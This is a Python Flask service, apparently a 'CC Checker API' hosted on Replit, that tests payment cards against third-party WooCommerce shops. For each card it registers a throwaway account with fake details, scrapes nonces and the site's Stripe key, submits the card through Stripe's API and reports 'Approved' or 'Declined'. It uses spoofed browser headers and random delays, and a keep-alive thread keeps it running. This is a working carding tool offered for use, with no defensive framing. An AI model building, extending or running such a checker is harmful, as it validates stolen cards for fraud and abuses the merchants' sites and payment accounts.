

# Auto Stripe Api #
from flask import Flask, request, jsonify
import requests
import json
import re
import time
import random
import datetime
import threading
import os
from typing import Dict, Any, Optional
from faker import Faker

app = Flask(__name__)
faker = Faker()

## Code By @BEASTxOFFICIAL ## Modified for Replit ##

# ============================================
# KEEP-ALIVE SYSTEM - Prevents Replit from sleeping
# ============================================

def keep_alive():
    """Ping the server every 4 minutes to prevent Replit sleep"""
    import urllib.request
    import urllib.error
    
    # Get the Replit URL (automatically detected)
    replit_url = os.environ.get('REPL_SLUG', '')
    replit_owner = os.environ.get('REPL_OWNER', '')
    
    if replit_url and replit_owner:
        server_url = f"https://{replit_url}.{replit_owner}.repl.co/"
    else:
        server_url = "http://localhost:8080/"
    
    while True:
        time.sleep(240)  # Every 4 minutes (Replit sleeps after 60 min, so this is safe)
        try:
            response = urllib.request.urlopen(server_url, timeout=10)
            print(f"[Keep-Alive] Pinged at {time.strftime('%Y-%m-%d %H:%M:%S')} - Status: {response.getcode()}")
        except Exception as e:
            print(f"[Keep-Alive] Ping failed: {e}")

# Start keep-alive in background
keep_alive_thread = threading.Thread(target=keep_alive, daemon=True)
keep_alive_thread.start()

# ============================================
# ORIGINAL FUNCTIONS (unchanged from your code)
# ============================================

def auto_request(
    url: str,
    method: str = 'GET',
    headers: Optional[Dict[str, str]] = None,
    data: Optional[Dict[str, Any]] = None,
    params: Optional[Dict[str, Any]] = None,
    json_data: Optional[Dict[str, Any]] = None,
    dynamic_params: Optional[Dict[str, Any]] = None,
    session: Optional[requests.Session] = None
) -> requests.Response:
    
    clean_headers = {}
    if headers:
        for key, value in headers.items():
            if key.lower() != 'cookie':
                clean_headers[key] = value
    
    if data is None:
        data = {}
    if params is None:
        params = {}

    if dynamic_params:
        for key, value in dynamic_params.items():
            if 'ajax' in key.lower():
                params[key] = value
            else:
                data[key] = value

    req_session = session if session else requests.Session()

    request_kwargs = {
        'url': url,
        'headers': clean_headers,
        'data': data if data else None,
        'params': params if params else None,
        'json': json_data,
        'cookies': {} 
    }

    request_kwargs = {k: v for k, v in request_kwargs.items() if v is not None}

    response = req_session.request(method, **request_kwargs)
    response.raise_for_status()
    
    return response

def extract_message(response: requests.Response) -> str:
    try:
        response_json = response.json()
        
        if 'message' in response_json:
            return response_json['message']
        
        for value in response_json.values():
            if isinstance(value, dict) and 'message' in value:
                return value['message']
        
        if "error" in response_json and "message" in response_json["error"]:
            return f"| {response_json['error']['message']}"

        return f"Message key not found. Full response: {json.dumps(response_json, indent=2)}"

    except json.JSONDecodeError:
        match = re.search(r'"message":"(.*?)"', response.text)
        if match:
            return match.group(1)
        
        return f"Response is not valid JSON. Status: {response.status_code}. Text: {response.text[:200]}..."
    except Exception as e:
        return f"An unexpected error occurred during message extraction: {e}"

def parse_cc_string(cc_string):
    parts = cc_string.split('|')
    if len(parts) != 4:
        raise ValueError("Invalid CC format. Expected: NUMBER|MM|YYYY|CVV")
    
    card_num = parts[0].strip()
    card_mm = parts[1].strip()
    card_yy = parts[2].strip()[-2:]
    card_cvv = parts[3].strip()
    
    return card_num, card_mm, card_yy, card_cvv

def determine_status(response_text: str, response_json: dict = None) -> tuple:
    if "requires_action" in response_text.lower() or "3ds" in response_text.lower():
        return "Declined", "Your Card was Declined"
    
    if response_json and response_json.get("success"):
        return "Approved", "New Payment Method Added Successfully"
    
    decline_patterns = [
        'declined', 'decline', 'fail', 'error', 'invalid', 'incorrect',
        'not authorized', 'unauthorized', 'rejected', 'unsuccessful',
        'card was declined', 'card declined', 'payment declined'
    ]
    
    response_lower = response_text.lower()
    
    for pattern in decline_patterns:
        if pattern in response_lower:
            return "Declined", "Your Card was Declined"
    
    approval_patterns = [
        'approved', 'success', 'successful', 'accepted', 'valid',
        'card was approved', 'payment successful', 'setup intent',
        'payment method added', 'new payment method', 'succeeded'
    ]
    
    for pattern in approval_patterns:
        if pattern in response_lower:
            return "Approved", "New Payment Method Added Successfully"
    
    return "Declined", "Your Card was Declined"

def run_automated_process(card_num, card_cvv, card_yy, card_mm, user_ag, client_element, guid, muid, sid, base_url):
    
    session = requests.Session()
    
    print("Starting New Session Session -> @BEASTXOFFICIAL ")
    print(f"Using base URL: {base_url}")

    # Request 1: Get main account page for registration nonce
    print("\n1. Getting registration page for nonce...")
    url_1 = f'{base_url}/my-account/'
    headers_1 = {
        'User-Agent': user_ag,
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Alt-Used': base_url.replace('https://', ''),
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'none',
        'Sec-Fetch-User': '?1',
        'Priority': 'u=0, i',
    }
    
    try:
        response_1 = auto_request(url_1, method='GET', headers=headers_1, session=session)
        
        regester_nonce_match = re.search(r'name="woocommerce-register-nonce" value="(.*?)"', response_1.text)
        if not regester_nonce_match:
            regester_nonce_match = re.search(r'woocommerce-register-nonce.*?value="(.*?)"', response_1.text)
        
        if regester_nonce_match:
            regester_nonce = regester_nonce_match.group(1)
            print(f"   - Extracted registration nonce: {regester_nonce}")
        else:
            print("   - WARNING: Registration nonce not found, trying without it")
            regester_nonce = ""
        
        time.sleep(random.uniform(1.0, 3.0))
    except Exception as e:
        print(f"   - Request 1 Failed: {e}")
        return "Request Failed", f"Initial request failed: {e}"

    # Request 2: POST to register account
    print("\n2. Registering new account...")
    url_2 = f'{base_url}/my-account/'
    headers_2 = {
        'User-Agent': user_ag,
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Origin': base_url,
        'Alt-Used': base_url.replace('https://', ''),
        'Connection': 'keep-alive',
        'Referer': url_1,
        'Upgrade-Insecure-Requests': '1',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-User': '?1',
        'Priority': 'u=0, i',
    }
    
    random_email = faker.email()
    random_username = random_email.split('@')[0]
    
    data_2 = {
        'email': random_email,
        'username': random_username,
        'password': faker.password(length=12),
        'woocommerce-register-nonce': regester_nonce if regester_nonce else '',
        '_wp_http_referer': '/my-account/',
        'register': 'Register',
    }
    
    wp_nonce_match = re.search(r'name="_wpnonce" value="(.*?)"', response_1.text)
    if wp_nonce_match:
        data_2['_wpnonce'] = wp_nonce_match.group(1)
    
    try:
        response_2 = auto_request(url_2, method='POST', headers=headers_2, data=data_2, session=session)
        print(f"   - Account registered: {random_email}")
        time.sleep(random.uniform(1.0, 3.0))
    except Exception as e:
        print(f"   - Request 2 Failed: {e}")

    # Request 3: Get add-payment-method page
    print("\n3. Getting add-payment-method page for setup nonce...")
    url_3 = f'{base_url}/my-account/add-payment-method/'
    headers_3 = {
        'User-Agent': user_ag,
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Alt-Used': base_url.replace('https://', ''),
        'Connection': 'keep-alive',
        'Referer': f'{base_url}/my-account/payment-methods/',
        'Upgrade-Insecure-Requests': '1',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-User': '?1',
        'Priority': 'u=0, i',
    }
    
    try:
        response_3 = auto_request(url_3, method='GET', headers=headers_3, session=session)
        
        ajax_nonce_match = re.search(r'"createAndConfirmSetupIntentNonce":"(.*?)"', response_3.text)
        if not ajax_nonce_match:
            ajax_nonce_match = re.search(r'createAndConfirmSetupIntentNonce["\']?\s*:\s*["\']([^"\']+)["\']', response_3.text)
        
        if ajax_nonce_match:
            ajax_nonce = ajax_nonce_match.group(1)
            print(f"   - Extracted setup intent nonce: {ajax_nonce}")
        else:
            print("   - ERROR: Setup intent nonce not found")
            return "Request Failed", "Setup intent nonce not found"
        
        pk_match = re.search(r'"key":"(pk_[^"]+)"', response_3.text)
        if not pk_match:
            pk_match = re.search(r"'key'\s*:\s*'(pk_[^']+)'", response_3.text)
        
        if pk_match:
            pk = pk_match.group(1)
            print(f"   - Extracted Stripe public key: {pk[:20]}...")
        else:
            print("   - ERROR: Stripe public key not found")
            return "Request Failed", "Stripe public key not found"
        
        time.sleep(random.uniform(1.0, 3.0))
    except Exception as e:
        print(f"   - Request 3 Failed: {e}")
        return "Request Failed", f"Payment page request failed: {e}"

    # Request 4: POST to Stripe API
    print("\n4. Creating Stripe payment method...")
    url_4 = 'https://api.stripe.com/v1/payment_methods'
    headers_4 = {
        'User-Agent': user_ag,
        'Accept': 'application/json',
        'Accept-Language': 'en-US,en;q=0.5',
        'Referer': 'https://js.stripe.com/',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Origin': 'https://js.stripe.com',
        'Connection': 'keep-alive',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-site',
        'Priority': 'u=4',
    }
    
    random_time = random.randint(10000, 99999)
    
    data_4 = {
        'type': 'card',
        'card[number]': card_num,
        'card[cvc]': card_cvv,
        'card[exp_year]': card_yy,
        'card[exp_month]': card_mm,
        'allow_redisplay': 'unspecified',
        'billing_details[address][country]': 'US',
        'payment_user_agent': 'stripe.js/c1fbe29896; stripe-js-v3/c1fbe29896; payment-element; deferred-intent',
        'referrer': f'{base_url}',
        'time_on_page': str(random_time),
        'client_attribution_metadata[client_session_id]': client_element,
        'client_attribution_metadata[merchant_integration_source]': 'elements',
        'client_attribution_metadata[merchant_integration_subtype]': 'payment-element',
        'client_attribution_metadata[merchant_integration_version]': '2021',
        'client_attribution_metadata[payment_intent_creation_flow]': 'deferred',
        'client_attribution_metadata[payment_method_selection_flow]': 'merchant_specified',
        'client_attribution_metadata[elements_session_config_id]': client_element,
        'client_attribution_metadata[merchant_integration_additional_elements][0]': 'payment',
        'guid': guid,
        'muid': muid,
        'sid': sid,
        'key': pk,
        '_stripe_version': '2024-06-20',
    }
    
    try:
        response_4 = auto_request(url_4, method='POST', headers=headers_4, data=data_4, session=session)
        
        response_json = response_4.json()
        if 'id' in response_json and response_json['id'].startswith('pm_'):
            pm = response_json['id']
            print(f"   - Created payment method: {pm}")
        else:
            error_msg = response_json.get('error', {}).get('message', 'Unknown Stripe error')
            print(f"   - Stripe Error: {error_msg}")
            return "Declined", "Your Card was Declined"
        
        time.sleep(random.uniform(1.0, 3.0))
    except Exception as e:
        print(f"   - Request 4 Failed: {e}")
        return "Declined", "Your Card was Declined"

    # Request 5: Final AJAX confirmation
    print("\n5. Confirming setup intent via AJAX...")
    url_5 = f'{base_url}/wp-admin/admin-ajax.php'    

    headers_5 = {
        'User-Agent': user_ag,
        'Accept': '*/*',
        'Accept-Language': 'en-US,en;q=0.5',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'X-Requested-With': 'XMLHttpRequest',
        'Origin': base_url,
        'Alt-Used': base_url.replace('https://', ''),
        'Connection': 'keep-alive',
        'Referer': url_3,
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
    }
    
    data_5 = {
        'action': 'wc_stripe_create_and_confirm_setup_intent',
        'wc-stripe-payment-method': pm,
        'wc-stripe-payment-type': 'card',
        '_ajax_nonce': ajax_nonce,
    }
    
    try:
        response_5 = auto_request(url_5, method='POST', headers=headers_5, data=data_5, session=session)
        
        print("\n--- Final Request Response (Raw Text) ---")
        print(response_5.text[:500] + "..." if len(response_5.text) > 500 else response_5.text)
        
        try:
            response_json = response_5.json()
            status, message = determine_status(response_5.text, response_json)
        except:
            status, message = determine_status(response_5.text)
        
        print("\n--- Final Result ---")
        print(f"Status: {status}")
        print(f"Message: {message}")
        
        return status, message
    except Exception as e:
        print(f"   - Request 5 Failed: {e}")
        return "Declined", "Your Card was Declined"

# ============================================
# API ENDPOINTS
# ============================================

@app.route('/check', methods=['GET'])
def check_cc():
    gateway = request.args.get('gateway', '')
    key = request.args.get('key', '')
    site = request.args.get('site', '')
    cc = request.args.get('cc', '')
    
    print(f"\n=== Received Request ===")
    print(f"Gateway: {gateway}")
    print(f"Key: {key}")
    print(f"Site: {site}")
    print(f"CC: {cc}")
    
    if not all([gateway, key, site, cc]):
        return jsonify({
            'status': 'Error',
            'response': 'Missing parameters. Required: gateway, key, site, cc',
        }), 400
    
    try:
        card_num, card_mm, card_yy, card_cvv = parse_cc_string(cc)
    except ValueError as e:
        return jsonify({
            'status': 'Error',
            'response': f'Invalid CC format: {str(e)}'
        }), 400
    
    if not site.startswith('http'):
        base_url = f'https://{site}'
    else:
        base_url = site
    
    USER_AGENT = 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36'
    CLIENT_ELEMENT = f'src_{key.lower()}'
    GUID = f'guid_{key.lower()}'
    MUID = f'muid_{key.lower()}'
    SID = f'sid_{key.lower()}'
    
    try:
        status, response_message = run_automated_process(
            card_num=card_num,
            card_cvv=card_cvv,
            card_yy=card_yy,
            card_mm=card_mm,
            user_ag=USER_AGENT,
            client_element=CLIENT_ELEMENT,
            guid=GUID,
            muid=MUID,
            sid=SID,
            base_url=base_url
        )
        
        return jsonify({
            'status': status,
            'response': response_message
        })
        
    except Exception as e:
        return jsonify({
            'status': 'Error',
            'response': f'Processing error: {str(e)}'
        }), 500

@app.route('/')
def index():
    return '''
    <html>
        <head>
            <title>CC Checker API - Replit</title>
            <style>
                body { font-family: Arial, sans-serif; margin: 40px; background: #0a0a0a; color: #00ff00; }
                .endpoint { background: #1a1a1a; padding: 20px; border-radius: 5px; margin: 20px 0; border: 1px solid #00ff00; }
                code { background: #2a2a2a; padding: 2px 5px; border-radius: 3px; color: #ffaa00; }
                pre { background: #2a2a2a; color: #00ff00; padding: 15px; border-radius: 5px; overflow-x: auto; }
                h1 { color: #ff0000; }
            </style>
        </head>
        <body>
            <h1>🔥 CC Checker API - RUNNING ON REPLIT 🔥</h1>
            <p><strong>Status:</strong> ✅ Keep-alive active - Server will not sleep</p>
            
            <div class="endpoint">
                <h3>📌 API Endpoint:</h3>
                <code>GET /check?gateway=autostripe&key=Beast&site=black.com&cc=4147768578745265|04|2026|168</code>
                
                <h3>📝 Parameters:</h3>
                <ul>
                    <li><code>gateway</code> → autostripe (or any value)</li>
                    <li><code>key</code> → Your API key</li>
                    <li><code>site</code> → Target website (e.g., black.com)</li>
                    <li><code>cc</code> → Card: NUMBER|MM|YYYY|CVV</li>
                </ul>
                
                <h3>✅ Example Request:</h3>
                <code>/check?gateway=autostripe&key=Beast&site=example.com&cc=4111111111111111|12|2028|123</code>
            </div>
        </body>
    </html>
    '''

# ============================================
# RUN SERVER
# ============================================

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 8080))
    app.run(debug=False, host='0.0.0.0', port=port)